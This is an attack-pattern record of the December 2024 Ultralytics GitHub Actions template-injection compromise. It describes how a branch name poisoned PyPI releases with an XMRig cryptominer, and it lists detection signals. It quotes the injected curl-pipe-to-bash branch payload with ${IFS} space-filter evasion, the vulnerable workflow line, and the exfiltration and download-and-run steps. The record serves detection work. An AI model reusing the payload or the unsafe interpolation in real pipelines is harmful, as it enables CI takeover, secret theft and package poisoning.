---
type: AttackPattern
description: GitHub Actions template injection in ultralytics/actions composite action poisoned PyPI releases with XMRig cryptominer via branch name injection and pip cache poisoning (Dec 2024)
tags: [build-artifact-only]
---
# Ultralytics GitHub Actions template injection (December 2024)

## Carrier
GitHub pull requests #18018 and #18020 against the ultralytics/ultralytics repository; the malicious code was embedded in the PR branch name itself, not in any file diffs (the PRs contained zero code changes)

## Technique
The `ultralytics/actions` composite action (v0.0.24+) contained an unquoted template injection in its "Commit and Push Changes" step: `git pull origin ${{ github.head_ref || github.ref }}`. A crafted branch name like `$({curl,-sSfL,raw.githubusercontent.com/.../file.sh}${IFS}|${IFS}bash)` injected shell commands into the action's `run:` block. The repository's `format.yml` workflow triggered on `pull_request_target` and invoked `ultralytics/actions@main`, granting the attacker code execution in the privileged CI context with access to repository secrets. The vulnerability (GHSA-7x29-qqmq-v6qc) was patched in v0.0.3 (Aug 2024) then reintroduced in v0.0.24 (Aug 2024). In CI, the attacker exfiltrated GitHub tokens and the pip CacheServerUrl via a webhook, then poisoned the `setup-python` cache.

## Payload/effect
Poisoned pip cache produced PyPI versions 8.3.41 and 8.3.42 with modified `ultralytics/models/yolo/model.py` and `ultralytics/utils/downloads.py`: a `safe_download()` function fetched XMRig ELF (Linux x86) or Mach-O (macOS arm64) binaries from GitHub blob storage, and `safe_run()` executed them as `/tmp/ultralytics_runner`. Later versions 8.3.45 and 8.3.46 were uploaded via stolen API token: 8.3.45 exfiltrated base64-encoded environment variables via webhook; 8.3.46 downloaded and ran XMRig v6.22.2 directly. Unconfirmed: the exact final payload used in PR #18018 was never recovered (the referenced commit was deleted).

## Detectable signal
The shape, which catches a variant sharing no text with this incident:
- a GitHub Actions `run:` block interpolating a `${{ }}` expression whose value an outside
  contributor controls: `github.head_ref`, `github.ref`, `github.event.pull_request.title`,
  `github.event.comment.body`. The expression is substituted into the shell script *before* the
  shell parses it, so quoting inside the script does not help; the fix is passing it through `env:`
- any branch, tag, or ref name reaching a shell, since a ref name may legally contain shell
  metacharacters
- a command-substitution or brace-expansion construct inside a ref, filename, or user-supplied
  string: `$(`, `${IFS}`, backticks, or a comma-separated brace list used to dodge a space filter
- a cache restored in one workflow and consumed by a publishing workflow, which lets an injection
  in a low-privilege job reach a release artifact

Literals from this incident, which confirm a replay but will not find a new one:
- `git pull origin ${{ github.head_ref || github.ref }}`
- the injection payload marker `$({curl,-sSfL,` followed by `${IFS}|${IFS}bash)`

## Sources
- https://blog.yossarian.net/2024/12/06/zizmor-ultralytics-injection
- https://github.com/ultralytics/actions/security/advisories/GHSA-7x29-qqmq-v6qc
- https://www.hiddenlayer.com/research/ultralytics-python-package-compromise-deploys-cryptominer
- https://blog.gitguardian.com/the-ultralytics-supply-chain-attack-connecting-the-dots-with-gitguardians-public-monitoring-data/
